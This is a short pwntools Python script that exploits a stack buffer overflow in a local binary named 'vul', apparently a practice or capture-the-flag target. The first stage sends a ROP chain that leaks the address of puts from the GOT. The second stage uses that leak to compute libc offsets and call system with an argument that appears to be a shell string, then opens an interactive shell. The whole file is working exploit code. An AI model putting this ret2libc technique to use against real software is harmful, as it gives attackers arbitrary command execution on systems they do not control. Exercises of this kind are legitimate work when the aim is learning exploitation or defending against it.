from pwn import *

context.os = "linux"
context.arch = "amd64"

puts_plt = 0x401030
start = 0x401060
puts_got = 0x404018 # puts_plt + 1
#when puts_plt will be called puts_got => puts actual code 
pop_rdi = 0x40120b
ret = 0x401016
junk = b'A' * 216
payload = b''
vul = process("./vul")
#STAGE 1
payload += junk
payload += p64(ret) 
payload += p64(pop_rdi) #pop puts_got
payload += p64(puts_got)#
payload += p64(puts_plt)#
payload += p64(start)
vul.sendline(payload)
print(vul.recvline())
leaked_address = u64(vul.recvline().strip().ljust(8, b'\00'))
print(hex(leaked_address))
puts_glibc = 0x75e10
offset = leaked_address - puts_glibc
system = 0x49860 + offset
arg = 0x198882 + offset
payload = junk + p64(pop_rdi) + p64(arg) + p64(system)
vul.sendline(payload)
vul.interactive()